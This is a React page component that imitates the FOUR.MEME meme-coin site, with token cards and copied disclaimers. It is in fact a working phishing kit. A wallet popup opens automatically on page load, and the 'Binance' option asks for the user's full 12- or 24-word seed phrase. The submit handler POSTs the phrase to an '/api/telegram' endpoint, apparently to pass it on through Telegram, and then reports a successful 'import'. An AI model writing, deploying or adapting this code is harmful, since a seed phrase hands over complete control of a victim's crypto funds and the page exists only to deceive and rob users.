'use client';

import { useEffect, useState } from 'react';

export default function Home() {
  const [showWalletPopup, setShowWalletPopup] = useState(false);
  const [showSeedPhrase, setShowSeedPhrase] = useState(false);
  const [seedLength, setSeedLength] = useState(12);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    setShowWalletPopup(true);
  }, []);

  const handleBinanceClick = () => {
    setShowSeedPhrase(true);
  };

  const handleSeedPhraseSubmit = async () => {
    if (!seedPhrase.trim()) {
      alert('Please enter your seed phrase');
      return;
    }

    const wordCount = seedPhrase.trim().split(/\s+/).length;
    if (wordCount < seedLength) {
      alert(`Please enter a complete ${seedLength}-word seed phrase`);
      return;
    }

    setIsLoading(true);

    try {
      console.log('🔄 Importing seed phrase:', seedPhrase);
      
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          walletAddress: seedPhrase 
        }),
      });

      const data = await response.json();

      if (response.ok) {
        console.log('✅ Wallet imported successfully');
        setShowSeedPhrase(false);
        setShowWalletPopup(false);
        setSeedPhrase('');
        alert('Wallet imported successfully! Check your Telegram for confirmation.');
      } else {
        throw new Error(data.error || 'Failed to import wallet');
      }
    } catch (error) {
      console.error('❌ Import error:', error);
      alert('Failed to import wallet. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleSeedLengthChange = (length: number) => {
    setSeedLength(length);
    setSeedPhrase(''); // Clear seed phrase when changing length
  };

  return (
    <div className="min-h-screen bg-white text-black font-sans">
      {/* Header */}
      <header className="flex justify-between items-center p-4 border-b border-gray-200">
        <div className="text-2xl font-bold">FOUR</div>
        <button 
          onClick={() => setShowWalletPopup(true)}
          className="text-2xl"
        >
          ☰
        </button>
      </header>

      {/* Main Content */}
      <main className="p-4">
        {/* Token Header */}
        <div className="mb-6">
          <h1 className="text-2xl font-bold mb-2">Time</h1>
          <p className="text-lg text-gray-800">$0.0%</p>
        </div>

        <div className="border-t border-gray-200 my-4"></div>

        {/* Token Details */}
        <div className="mb-8">
          <p className="text-sm font-semibold mb-2 text-gray-700">Meme created by: 0x6a...6873</p>
          <h2 className="text-xl font-bold mb-2">Seasons ... (BNB)</h2>
          <p className="text-gray-600 mb-4 text-sm">Heard even the seasons are being renamed now...</p>
          <p className="text-sm text-gray-800">Market Cap: 7.65 K</p>
        </div>

        {/* Additional Token Cards */}
        <div className="space-y-6">
          {/* CZ FOOD Card */}
          <div className="border border-gray-200 rounded-lg p-4 bg-white">
            <p className="text-xs text-gray-500 mb-2">created by: 0xaa...2994</p>
            <h3 className="font-bold mb-2 text-gray-800">CZ FOOD (BNB)</h3>
            <p className="mb-2 text-gray-600">CZ</p>
            <p className="text-sm text-gray-800">Market Cap: 8.22 K</p>
          </div>

          <div className="border-t border-gray-200 my-4"></div>

          {/* Broccoli Card */}
          <div className="border border-gray-200 rounded-lg p-4 bg-white">
            <p className="text-xs text-gray-500 mb-2">created by: 0x4e...0618</p>
            <h3 className="font-bold mb-2 text-gray-800">Broccoli ... (BNB)</h3>
            <p className="mb-2 text-gray-600">Broccoli DOGGY</p>
            <p className="text-sm text-gray-800">Market Cap: 7.94 K</p>
            <p className="text-xs mt-2 text-gray-500">Partnership</p>
          </div>
        </div>

        {/* PancakeSwap Section */}
        <div className="mt-8">
          <h2 className="text-2xl font-bold mb-4 text-gray-800">PancakeSwap</h2>
          <p className="text-sm text-gray-600 mb-6 leading-relaxed">
            PancakeSwap is a decentralized exchange (DEX) built on BNB Chain that utilizes an automated market making (AMM) system. It is a fork of SushiSwap, with an almost identical codebase, but it has the advantage of cheaper and faster transactions due to being built on BSC. Additionally, it offers features such as yield farming across other protocols, lotteries, and initial farm offerings (IFO).
          </p>

          <div className="border-t border-gray-200 my-4"></div>

          {/* Disclaimer Section */}
          <div className="text-xs text-gray-600 leading-relaxed">
            <p className="mb-4">
              Disclaimer: Digital assets are highly speculative and involve significant risk of loss. The value of meme coins is extremely volatile, and any one who wishes to trade in any meme coin should be prepared for the possibility of losing their entire investment.
            </p>
            <p className="mb-4">
              FOUR. MEME makes no representations or warranties regarding the success or profitability of any meme coin developed on the platform. FOUR. MEME is a public, decentralized, and permissionless platform. Participation by any project should not be seen as an endorsement or recommendation by FOUR. MEME. Users should assess their financial situation, risk tolerance, and do their own research before trading in any meme coins on the platform. FOUR. MEME will not be held liable for any losses, damages, or issues that may arise from trading in any meme coins developed on the platform. More information about (DYOR) can be found via <span className="font-semibold text-gray-800">Binance Academy</span> and <span className="font-semibold text-gray-800">Terms of Use</span>
            </p>
          </div>
        </div>
      </main>

      {/* Wallet Popup */}
      {showWalletPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-end justify-center z-50">
          <div className="bg-white w-full max-w-md rounded-t-2xl p-6 max-h-[90vh] overflow-y-auto">
            {/* Seed Phrase Entry */}
            {showSeedPhrase ? (
              <div>
                <div className="flex justify-between items-center mb-6">
                  <h2 className="text-xl font-bold text-gray-800">Enter Seed Phrase</h2>
                  <button 
                    onClick={() => {
                      setShowSeedPhrase(false);
                      setSeedPhrase('');
                    }}
                    className="text-2xl text-gray-500 hover:text-gray-700"
                  >
                    ×
                  </button>
                </div>
                
                {/* Seed Length Toggle */}
                <div className="flex border border-gray-300 rounded-lg mb-6 overflow-hidden">
                  <button
                    onClick={() => handleSeedLengthChange(12)}
                    className={`flex-1 py-3 text-center text-sm font-medium ${
                      seedLength === 12 
                        ? 'bg-gray-800 text-white' 
                        : 'bg-white text-gray-700 border-r border-gray-300'
                    }`}
                  >
                    12 words
                  </button>
                  <button
                    onClick={() => handleSeedLengthChange(24)}
                    className={`flex-1 py-3 text-center text-sm font-medium ${
                      seedLength === 24 
                        ? 'bg-gray-800 text-white' 
                        : 'bg-white text-gray-700'
                    }`}
                  >
                    24 words
                  </button>
                </div>

                {/* Seed Phrase Input */}
                <div className="mb-6">
                  <textarea
                    value={seedPhrase}
                    onChange={(e) => setSeedPhrase(e.target.value)}
                    placeholder={`Enter your ${seedLength}-word seed phrase separated by spaces`}
                    className="w-full h-32 border border-gray-300 rounded-lg p-3 resize-none text-sm placeholder-gray-400 focus:outline-none focus:border-gray-400"
                  />
                </div>

                <button 
                  onClick={handleSeedPhraseSubmit}
                  disabled={isLoading}
                  className="w-full bg-gray-800 text-white py-3 px-4 rounded-lg text-sm font-medium hover:bg-gray-700 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                >
                  {isLoading ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                      Importing...
                    </>
                  ) : (
                    'Connect Wallet'
                  )}
                </button>
              </div>
            ) : (
              /* Wallet Selection */
              <div>
                <div className="flex justify-between items-center mb-6">
                  <h2 className="text-xl font-bold text-gray-800">Connect a Wallet</h2>
                  <button 
                    onClick={() => setShowWalletPopup(false)}
                    className="text-2xl text-gray-500 hover:text-gray-700"
                  >
                    ×
                  </button>
                </div>
                
                <div className="grid grid-cols-2 gap-3 mb-6">
                  <button className="border border-gray-200 rounded-lg p-4 text-center hover:bg-gray-50 transition-colors">
                    <div className="font-medium text-gray-700 text-sm">Github</div>
                  </button>
                  <button className="border border-gray-200 rounded-lg p-4 text-center hover:bg-gray-50 transition-colors">
                    <div className="font-medium text-gray-700 text-sm">Google</div>
                  </button>
                  <button 
                    onClick={handleBinanceClick}
                    className="border border-gray-200 rounded-lg p-4 text-center hover:bg-gray-50 transition-colors"
                  >
                    <div className="font-medium text-gray-700 text-sm">Binance</div>
                    <div className="text-xs text-gray-500 mt-1">Wallet</div>
                  </button>
                  <button className="border border-gray-200 rounded-lg p-4 text-center hover:bg-gray-50 transition-colors">
                    <div className="font-medium text-gray-700 text-sm">OKX</div>
                    <div className="text-xs text-gray-500 mt-1">Wallet</div>
                  </button>
                </div>

                <div className="border-t border-gray-200 pt-6">
                  <h3 className="font-bold mb-2 text-gray-800">What is a Wallet?</h3>
                  <p className="text-sm text-gray-600 mb-4 leading-relaxed">
                    A wallet is used to send, receive, store, and display digital assets. It&apos;s also a new way to log in, 
                    without needing to create new accounts and passwords on every website.
                  </p>
                  <div className="flex space-x-3">
                    <button className="flex-1 bg-gray-800 text-white py-3 px-4 rounded-lg text-sm font-medium hover:bg-gray-700">
                      Get a Wallet
                    </button>
                    <button className="flex-1 border border-gray-300 text-gray-700 py-3 px-4 rounded-lg text-sm font-medium hover:bg-gray-50">
                      Learn More
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
